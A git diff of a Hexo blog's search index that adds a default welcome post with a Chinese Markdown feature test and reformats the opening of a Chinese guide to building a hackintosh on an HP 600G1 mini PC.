@@ -1,16 +1,266 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>HP 600G1 DM 微型主机安装黑苹果</title>
-    <url>/2024/05/14/HP-600G1-DM-%E5%BE%AE%E5%9E%8B%E4%B8%BB%E6%9C%BA%E5%AE%89%E8%A3%85%E9%BB%91%E8%8B%B9%E6%9E%9C/</url>
-    <content><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a><img  
+    <title>Hello World</title>
+    <url>/2024/05/11/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
+<h2 id="quick-start"><a class="markdownIt-Anchor" href="#quick-start"></a> Quick Start</h2>
+<h3 id="create-a-new-post"><a class="markdownIt-Anchor" href="#create-a-new-post"></a> Create a new post</h3>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>
+<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="run-server"><a class="markdownIt-Anchor" href="#run-server"></a> Run server</h3>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>
+<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="generate-static-files"><a class="markdownIt-Anchor" href="#generate-static-files"></a> Generate static files</h3>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>
+<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="deploy-to-remote-sites"><a class="markdownIt-Anchor" href="#deploy-to-remote-sites"></a> Deploy to remote sites</h3>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>
+<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="以下是一些markdown功能测试测试代码来自leanote"><a class="markdownIt-Anchor" href="#以下是一些markdown功能测试测试代码来自leanote"></a> 以下是一些markdown功能测试，测试代码来自Leanote</h2>
+<h2 id="1-排版"><a class="markdownIt-Anchor" href="#1-排版"></a> 1. 排版</h2>
+<p><strong>粗体</strong> <em>斜体</em></p>
+<p><s>这是一段错误的文本。</s></p>
+<p>引用:</p>
+<blockquote>
+<p>引用Leanote官方的话, 为什么要做Leanote, 原因是…</p>
+</blockquote>
+<p>有充列表:</p>
+<ol>
+<li>支持Vim</li>
+<li>支持Emacs</li>
+</ol>
+<p>无序列表:</p>
+<ul>
+<li>项目1</li>
+<li>项目2</li>
+</ul>
+<h2 id="2-图片与链接"><a class="markdownIt-Anchor" href="#2-图片与链接"></a> 2. 图片与链接</h2>
+<p>图片:<br />
+<img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/hp600g1.jpg"
-                      alt="hp600g1"
-                ></h2><h2 id="0-硬件选择"><a href="#0-硬件选择" class="headerlink" title="0.硬件选择"></a>0.硬件选择</h2><h3 id="01-准系统选择"><a href="#01-准系统选择" class="headerlink" title="01.准系统选择"></a>01.准系统选择</h3><p>在2024年3月节点, 200元左右价位可选的小主机准系统大概有以下几种型号 :</p>
+                     data-src="http://leanote.com/images/logo/leanote_icon_blue.png"
+                      alt="leanote" 
+                ><br />
+链接:</p>
+<p><a class="link"   href="http://leanote.leanote.com" >这是去往Leanote官方博客的链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="3-标题"><a class="markdownIt-Anchor" href="#3-标题"></a> 3. 标题</h2>
+<p>以下是各级标题, 最多支持5级标题</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># h1</span><br><span class="line">## h2</span><br><span class="line">### h3</span><br><span class="line">#### h4</span><br><span class="line">##### h4</span><br><span class="line">###### h5</span><br></pre></td></tr></table></figure></div>
+<h2 id="4-代码"><a class="markdownIt-Anchor" href="#4-代码"></a> 4. 代码</h2>
+<p>示例:</p>
+<pre><code>function get(key) &#123;
+    return m[key];
+&#125;
+</code></pre>
+<p>代码高亮示例:</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* nth element in the fibonacci series.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> n &gt;= 0</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> the nth element, &gt;= 0.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fib</span>(<span class="params">n</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">1</span>, b = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> tmp;</span><br><span class="line">  <span class="keyword">while</span> (--n &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    tmp = a;</span><br><span class="line">    a += b;</span><br><span class="line">    b = tmp;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="title function_">fib</span>(<span class="number">10</span>));</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Employee</span>:</span><br><span class="line">   empCount = <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, salary</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.salary = salary</span><br><span class="line">        Employee.empCount += <span class="number">1</span></span><br></pre></td></tr></table></figure></div>
+<h1 id="5-markdown-扩展"><a class="markdownIt-Anchor" href="#5-markdown-扩展"></a> 5. Markdown 扩展</h1>
+<p>Markdown 扩展支持:</p>
 <ul>
-<li><p>联想 : m73, m73p, m93p, m7300hq</p>
+<li>表格</li>
+<li>定义型列表</li>
+<li>Html 标签</li>
+<li>脚注</li>
+<li>目录</li>
+<li>时序图与流程图</li>
+<li>MathJax 公式</li>
+</ul>
+<h2 id="51-表格"><a class="markdownIt-Anchor" href="#51-表格"></a> 5.1 表格</h2>
+<table>
+<thead>
+<tr>
+<th>Item</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Computer</td>
+<td>$1600</td>
+</tr>
+<tr>
+<td>Phone</td>
+<td>$12</td>
+</tr>
+<tr>
+<td>Pipe</td>
+<td>$1</td>
+</tr>
+</tbody>
+</table>
+<p>可以指定对齐方式, 如Item列左对齐, Value列右对齐, Qty列居中对齐</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Item</th>
+<th style="text-align:right">Value</th>
+<th style="text-align:center">Qty</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">Computer</td>
+<td style="text-align:right">$1600</td>
+<td style="text-align:center">5</td>
+</tr>
+<tr>
+<td style="text-align:left">Phone</td>
+<td style="text-align:right">$12</td>
+<td style="text-align:center">12</td>
+</tr>
+<tr>
+<td style="text-align:left">Pipe</td>
+<td style="text-align:right">$1</td>
+<td style="text-align:center">234</td>
+</tr>
+</tbody>
+</table>
+<h2 id="52-定义型列表"><a class="markdownIt-Anchor" href="#52-定义型列表"></a> 5.2 定义型列表</h2>
+<dl>
+<dt>名词 1</dt>
+<dd>
+<p>定义 1（左侧有一个可见的冒号和四个不可见的空格）</p>
+</dd>
+<dt>代码块 2</dt>
+<dd>
+<p>这是代码块的定义（左侧有一个可见的冒号和四个不可见的空格）</p>
+<pre><code>  代码块（左侧有八个不可见的空格）
+</code></pre>
+</dd>
+</dl>
+<h2 id="53-html-标签"><a class="markdownIt-Anchor" href="#53-html-标签"></a> 5.3 Html 标签</h2>
+<p>支持在 Markdown 语法中嵌套 Html 标签，譬如，你可以用 Html 写一个纵跨两行的表格：</p>
+<pre><code>&lt;table&gt;
+    &lt;tr&gt;
+        &lt;th rowspan=&quot;2&quot;&gt;值班人员&lt;/th&gt;
+        &lt;th&gt;星期一&lt;/th&gt;
+        &lt;th&gt;星期二&lt;/th&gt;
+        &lt;th&gt;星期三&lt;/th&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+        &lt;td&gt;李强&lt;/td&gt;
+        &lt;td&gt;张明&lt;/td&gt;
+        &lt;td&gt;王平&lt;/td&gt;
+    &lt;/tr&gt;
+&lt;/table&gt;
+</code></pre>
+<table>
+    <tr>
+        <th rowspan="2">值班人员</th>
+        <th>星期一</th>
+        <th>星期二</th>
+        <th>星期三</th>
+    </tr>
+    <tr>
+        <td>李强</td>
+        <td>张明</td>
+        <td>王平</td>
+    </tr>
+</table>
+<p><strong>提示</strong>, 如果想对图片的宽度和高度进行控制, 你也可以通过img标签, 如:</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://leanote.com/images/logo/leanote_icon_blue.png"
+                      width="50px" 
+                >
+<h2 id="54-脚注"><a class="markdownIt-Anchor" href="#54-脚注"></a> 5.4 脚注</h2>
+<p>Leanote<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>来创建一个脚注</p>
+<h2 id="55-目录"><a class="markdownIt-Anchor" href="#55-目录"></a> 5.5 目录</h2>
+<p>通过 <code>[TOC]</code> 在文档中插入目录, 如:</p>
+<p>[TOC]</p>
+<h2 id="56-时序图与流程图"><a class="markdownIt-Anchor" href="#56-时序图与流程图"></a> 5.6 时序图与流程图</h2>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Alice-&gt;Bob: Hello Bob, how are you?</span><br><span class="line">Note right of Bob: Bob thinks</span><br><span class="line">Bob--&gt;Alice: I am good thanks!</span><br></pre></td></tr></table></figure></div>
+<p>流程图:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">st=&gt;start: Start</span><br><span class="line">e=&gt;end</span><br><span class="line">op=&gt;operation: My Operation</span><br><span class="line">cond=&gt;condition: Yes or No?</span><br><span class="line"> </span><br><span class="line">st-&gt;op-&gt;cond</span><br><span class="line">cond(yes)-&gt;e</span><br><span class="line">cond(no)-&gt;op</span><br></pre></td></tr></table></figure></div>
+<blockquote>
+<p><strong>提示:</strong> 更多关于时序图与流程图的语法请参考:</p>
+</blockquote>
+<blockquote>
+<ul>
+<li><a class="link"   href="http://bramp.github.io/js-sequence-diagrams/" >时序图语法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   href="http://adrai.github.io/flowchart.js" >流程图语法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+</blockquote>
+<h2 id="57-mathjax-公式"><a class="markdownIt-Anchor" href="#57-mathjax-公式"></a> 5.7 MathJax 公式</h2>
+<p>$ 表示行内公式：</p>
+<p>质能守恒方程可以用一个很简洁的方程式 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>=</mo><mi>m</mi><msup><mi>c</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">E=mc^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span> 来表达。</p>
+<p class='katex-block katex-error' title='ParseError: KaTeX parse error: Can&#039;t use function &#039;$&#039; in math mode at position 11:  表示整行公式：
+
+$̲$\sum_{i=1}^n a…'> 表示整行公式：
+
+$$\sum_{i=1}^n a_i=0</p>
+<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mi>x</mi></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>x</mi><mi>n</mi></msub><mo stretchy="false">)</mo><mo>=</mo><msubsup><mi>x</mi><mn>1</mn><mn>2</mn></msubsup><mo>+</mo><msubsup><mi>x</mi><mn>2</mn><mn>2</mn></msubsup><mo>+</mo><mo>⋯</mo><mo>+</mo><msubsup><mi>x</mi><mi>n</mi><mn>2</mn></msubsup></mrow><annotation encoding="application/x-tex">f(x_1,x_x,\ldots,x_n) = x_1^2 + x_2^2 + \cdots + x_n^2 
+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1111079999999998em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1111079999999998em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1111079999999998em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span></span></p>
+<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><munderover><mo>∑</mo><mrow><mi>k</mi><mo>=</mo><mn>0</mn></mrow><mrow><mi>j</mi><mo>−</mo><mn>1</mn></mrow></munderover><mrow><msub><mover accent="true"><mi>γ</mi><mo stretchy="true">^</mo></mover><mrow><mi>k</mi><mi>j</mi></mrow></msub><msub><mi>z</mi><mi>k</mi></msub></mrow></mrow><annotation encoding="application/x-tex">\sum^{j-1}_{k=0}{\widehat{\gamma}_{kj} z_k}
+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.16089em;vertical-align:-1.302113em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8587770000000001em;"><span style="top:-1.8478869999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.347113em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.302113em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.67056em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05556em;">γ</span></span></span><span class="svg-align" style="top:-3.43056em;"><span class="pstrut" style="height:3em;"></span><span style="height:0.24em;"><svg width='100%' height='0.24em' viewBox='0 0 1062 239' preserveAspectRatio='none'><path d='M529 0h5l519 115c5 1 9 5 9 10 0 1-1 2-1 3l-4 22
+c-1 5-5 9-11 9h-2L532 67 19 159h-2c-5 0-9-4-11-9l-5-22c-1-6 2-12 8-13z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></span></p>
+<p>更复杂的公式:</p>
+<p class='katex-block katex-error' title='ParseError: KaTeX parse error: No such environment: eqnarray at position 7: \begin{̲e̲q̲n̲a̲r̲r̲a̲y̲}̲
+\vec\nabla \ti…'>\begin{eqnarray}
+\vec\nabla \times (\vec\nabla f) &amp; = &amp; 0  \cdots\cdots梯度场必是无旋场\\
+\vec\nabla \cdot(\vec\nabla \times \vec F) &amp; = &amp; 0\cdots\cdots旋度场必是无散场\\
+\vec\nabla \cdot (\vec\nabla f) &amp; = &amp; {\vec\nabla}^2f\\
+\vec\nabla \times(\vec\nabla \times \vec F) &amp; = &amp; \vec\nabla(\vec\nabla \cdot \vec F) - {\vec\nabla}^2 \vec F\\
+\end{eqnarray}
+</p>
+<p>访问 <a class="link"   href="http://meta.math.stackexchange.com/questions/5020/mathjax-basic-tutorial-and-quick-reference" >MathJax <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 参考更多使用方法。</p>
+<blockquote>
+<p>[!NOTE]</p>
+<p>111</p>
+</blockquote>
+<blockquote>
+<p>[!TIP]</p>
+<p>222</p>
+</blockquote>
+<blockquote>
+<p>[!IMPORTANT]</p>
+<p>333</p>
+</blockquote>
+<blockquote>
+<p>[!WARNING]</p>
+<p>444</p>
+</blockquote>
+<blockquote>
+<p>[!CAUTION]</p>
+<p>张三</p>
+<p>多行</p>
+</blockquote>
+<p>测试文字<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup></p>
+<hr />
+<p><a href="www.bing.com">去必应</a></p>
+<hr />
+<p>iframe框架</p>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=530 height=520 src="//music.163.com/outchain/player?type=1&id=289617&auto=1&height=430"></iframe>
+<hr class="footnotes-sep" />
+<section class="footnotes">
+<ol class="footnotes-list">
+<li id="fn1" class="footnote-item"><p>Leanote是一款强大的开源云笔记产品. <a href="#fnref1" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn2" class="footnote-item"><p>这是一段脚注 <a href="#fnref2" class="footnote-backref">↩︎</a></p>
+</li>
+</ol>
+</section>
+]]></content>
+  </entry>
+  <entry>
+    <title>HP 600G1 DM 微型主机安装黑苹果</title>
+    <url>/2024/05/14/HP-600G1-DM-%E5%BE%AE%E5%9E%8B%E4%B8%BB%E6%9C%BA%E5%AE%89%E8%A3%85%E9%BB%91%E8%8B%B9%E6%9E%9C/</url>
+    <content><![CDATA[<h2 id="hp600g1"><a class="markdownIt-Anchor" href="#hp600g1"></a> <img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="images/hp600g1.jpg"
+                      alt="hp600g1" 
+                ></h2>
+<h2 id="0硬件选择"><a class="markdownIt-Anchor" href="#0硬件选择"></a> 0.硬件选择</h2>
+<h3 id="01准系统选择"><a class="markdownIt-Anchor" href="#01准系统选择"></a> 01.准系统选择</h3>
+<p>在2024年3月节点, 200元左右价位可选的小主机准系统大概有以下几种型号 :</p>
+<ul>
+<li>
+<p>联想 : m73, m73p, m93p, m7300hq</p>
 <ul>
 <li>其中m7300hq为m73的国内版本</li>
 </ul>
@@ -18,7 +268,8 @@
 <p>m73的黑苹果算是比较成熟的, 网上的教程也很多, 但是这台机器由于BIOS有网卡白名单机制, 如果更换黑苹果免驱网卡需要刷BIOS, 较为麻烦且风险较大, 如果不动BIOS在开机的时候会有报警提示音, 因此只能拔掉喇叭使用. 此外m73没有m.2固态硬盘位, 拓展性稍差.</p>
 </blockquote>
 </li>
-<li><p>戴尔 :</p>
+<li>
+<p>戴尔 :</p>
 <ul>
 <li>Optiplex 3020m</li>
 </ul>
@@ -26,7 +277,8 @@
 <p>戴尔的机器价格比较贵, 支持4代CPU的大概只有这一个选择, 且这个机器存量较少, 性价比低.</p>
 </blockquote>
 </li>
-<li><p>惠普 : </p>
+<li>
+<p>惠普 :</p>
 <ul>
 <li><a class="link"   href="https://support.hp.com/cn-zh/product/details/hp-prodesk-400-g1-desktop-mini-pc/7519860" >HP ProDesk 400 G1 微型台式电脑 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
 <li><a class="link"   href="https://support.hp.com/cn-zh/product/product-specs/hp-prodesk-600-g1-desktop-mini-pc/6595197" >HP ProDesk 600 G1 微型台式电脑 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
@@ -46,7 +298,8 @@
 <th>DP接口数量</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td>400G1</td>
 <td>H81</td>
 <td>2*3.0 + 4*2.0</td>
@@ -64,48 +317,69 @@
 <td>6*3.0</td>
 <td>2</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <p>三款机型中400G1和600G1为同一价位, 800G1稍贵, 综合来看, 600G1性价比更高一些. 400G1支持TDP最高35W的四代CPU, 上TDP更高的CPU会开机报错, 不过可以按F1键跳过报错继续开机. 三款机型均支持nvme硬盘, 但不支持开机引导, 后期可以通过魔改BIOS来实现nvme硬盘引导.</p>
 <p>综合考虑, 600G1性价比较高. 最终选择600G1准系统 + 原装65W电源.</p>
-<h3 id="02-CPU选择"><a href="#02-CPU选择" class="headerlink" title="02.CPU选择"></a>02.CPU选择</h3><p>当前时间节点四代i3的T后缀处理器价格为25-50元不等, 四代i5的T后缀处理器价格要高一倍不止, 遂最终选择i3-4360T, 主机原生支持, 不用修改BIOS.</p>
-<h3 id="03-内存选择"><a href="#03-内存选择" class="headerlink" title="03.内存选择"></a>03.内存选择</h3><p>当前时间节点DDR3代笔记本内存已经相当便宜, 最终选择单条8GB三星DDR3笔记本内存.</p>
-<h3 id="04-硬盘选择"><a href="#04-硬盘选择" class="headerlink" title="04.硬盘选择"></a>04.硬盘选择</h3><p>小主机仅原生支持AHCI协议的PCIe固态硬盘, 这种硬盘现已被淘汰且存货量稀少,二手价格高昂. 支持NVMe引导需要修改BIOS较为麻烦, 遂最终选择120GB三星SATA固态.</p>
-<h3 id="05-网卡选择"><a href="#05-网卡选择" class="headerlink" title="05.网卡选择"></a>05.网卡选择</h3><p>由于要装黑苹果系统, 网卡选择范围很小, 基本只有Broadcom的几款黑苹果免驱显卡. 最终选择BCM943224 + NGFF转接板 + 内置天线.</p>
-<h2 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1.前期准备"></a>1.前期准备</h2><h3 id="11-下载写盘工具"><a href="#11-下载写盘工具" class="headerlink" title="11.下载写盘工具"></a>11.下载写盘工具</h3><p><a class="link"   href="https://etcher.balena.io/" >BalenaEtcher <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="02cpu选择"><a class="markdownIt-Anchor" href="#02cpu选择"></a> 02.CPU选择</h3>
+<p>当前时间节点四代i3的T后缀处理器价格为25-50元不等, 四代i5的T后缀处理器价格要高一倍不止, 遂最终选择i3-4360T, 主机原生支持, 不用修改BIOS.</p>
+<h3 id="03内存选择"><a class="markdownIt-Anchor" href="#03内存选择"></a> 03.内存选择</h3>
+<p>当前时间节点DDR3代笔记本内存已经相当便宜, 最终选择单条8GB三星DDR3笔记本内存.</p>
